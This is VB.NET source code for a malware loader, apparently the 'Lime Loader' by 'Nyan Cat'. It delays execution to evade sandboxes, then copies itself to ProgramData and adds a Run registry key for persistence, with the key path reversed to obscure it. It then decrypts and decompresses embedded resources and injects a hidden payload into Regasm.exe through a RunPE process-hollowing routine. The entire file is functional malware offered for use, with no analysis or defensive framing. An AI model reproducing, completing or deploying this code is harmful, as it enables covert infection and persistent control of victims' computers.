Imports System.IO
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports System.Threading


'------------------------------------------
'Simple .NET loader | Nyan Cat 8/13/2018
'
'[1] Sleep
'[2] Drop Payload
'[3] Extract IMG1 which contain RunPE method , Extract IMG2 which contain Payload
'[4] Run RunPE method
'
'github.com/NYAN-x-CAT
'------------------------------------------

Public Class Main_
    Public Shared Count As Integer = 0
    Public Shared Sub Main()
        If Sleeping() Then
            Drop_.Install()
            RunPE_.Run(Resources_.LoadFile("IMG1"), Resources_.LoadFile("IMG2"), Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "Regasm.exe"))
        End If
    End Sub

    Private Shared Function Sleeping() As Boolean
        Do Until Count = 5
            Thread.Sleep(1000)
            Count += 1
        Loop
        Return True
    End Function
End Class

Public Class Drop_
    Public Shared EXE_ As String = "Payload.exe"
    Public Shared Path_ As String = Path.Combine(Environment.GetFolderPath(35), EXE_) 'C:\ProgramData

    Public Shared Sub Install()
        Try
            If Path_ <> Application.ExecutablePath Then
                IO.File.Copy(Application.ExecutablePath, Path_, True)
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(StrReverse("\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS")).SetValue(EXE_, Path_)
                Diagnostics.Process.Start(Path_)
                Environment.Exit(0)
            End If
        Catch : End Try
    End Sub
End Class

Public Class Resources_
    Public Shared Function LoadFile(ByVal GetObject As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("Lime_Loader.resources", MyAssembly)
        Return Compression_.GZip_(Cryptography_.AESDecrypt_(MyResource.GetObject(GetObject), "123"))
    End Function
End Class

Public Class RunPE_
    Public Shared Sub Run(ByVal DLL As Byte(), ByVal Payload As Byte(), ByVal Injection As String)
        Dim ASM_ As Assembly = Assembly.Load(DLL)
        Dim Type_ As Type = ASM_.GetType("ClassLibrary2.Class1") 'RunPeNameSpaceRoot.ClassName [for my case is ClassLibrary2.Class1]
        Dim Method_ As MethodInfo = Type_.GetMethod("Run", BindingFlags.Public Or BindingFlags.Static) 'Method
        Dim Object_ As Object = Activator.CreateInstance(Type_)
        Method_.Invoke(Object_, New Object() {Injection, Nothing, Payload, True})
    End Sub
End Class

Public Class Cryptography_
    Public Shared Function AESDecrypt_(ByVal File As Byte(), ByVal Pass As String) As Byte()
        Dim AES As System.Security.Cryptography.RijndaelManaged = New System.Security.Cryptography.RijndaelManaged()
        Dim hash As Byte() = New Byte(31) {}
        Dim temp As Byte() = New MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = System.Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor()
        Return DESDecrypter.TransformFinalBlock(File, 0, File.Length)
    End Function
End Class

Public Class Compression_
    Public Shared Function GZip_(ByVal B As Byte()) As Byte()
        Dim MS As New IO.MemoryStream(B)
        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
        Dim buffer As Byte() = New Byte(4 - 1) {}
        MS.Position = (MS.Length - 5)
        MS.Read(buffer, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer, 0)
        MS.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        Ziped.Read(array, 0, count)
        Ziped.Dispose()
        MS.Dispose()
        Return array
    End Function
End Class


'Public Shared Function AESEncrypt(ByVal input As Byte(), ByVal Pass As String) As Byte()
'    Dim AES As RijndaelManaged = New RijndaelManaged()
'    Dim hash As Byte() = New Byte(31) {}
'    Dim temp As Byte() = New MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass))
'    Array.Copy(temp, 0, hash, 0, 16)
'    Array.Copy(temp, 0, hash, 15, 16)
'    AES.Key = hash
'    AES.Mode = CipherMode.ECB
'    Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor()
'    Return DESEncrypter.TransformFinalBlock(input, 0, input.Length)
'End Function

'Public Function GZip(ByVal B As Byte()) As Byte()
'    Dim MS As New IO.MemoryStream
'    Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
'    Ziped.Write(B, 0, B.Length)
'    Ziped.Dispose()
'    MS.Position = 0
'    Dim buffer As Byte() = New Byte((CInt(MS.Length) + 1) - 1) {}
'    MS.Read(buffer, 0, buffer.Length)
'    MS.Dispose()
'    Return buffer
'End Function